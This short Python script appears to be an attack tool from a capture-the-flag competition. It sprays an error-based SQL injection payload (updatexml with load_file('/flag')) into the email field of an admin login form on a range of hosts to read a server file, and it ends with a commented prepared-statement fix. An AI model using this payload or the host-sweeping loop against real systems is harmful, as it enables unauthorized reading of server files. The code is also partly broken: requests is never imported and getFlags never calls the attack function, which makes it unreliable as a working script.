#coding:utf-8

import re

from Gen_IP import gen_ip

ips = gen_ip("172.16.5.10-172.16.5.35")
black_ips = ["172.16.5.20", "172.16.5.30"]
flags = []

def sqli(host):
    r = requests.post(url="http://%s:80/?p=admin&a=login"%host,data={"email":"'||(SELECT updatexml(1,concat(0x7e,(select load_file('/flag')),0x7e),1))||'","password":"pwd123"})
    flags = re.findall(r'~(.+?)~',r.content)
    if flags:
        return flags[0]
    else:
        return "error pwn!"    

def getFlags():
    for ip in ips:
        if ip not in black_ips:
            flags.append(ip)
            #print ip
    return flags
    print "Pwn!"



#fix
#$oStmt = $this->oDb->prepare("SELECT email, password FROM Admins WHERE email = ? LIMIT 1");  
#$oStmt->execute($sEmail);  
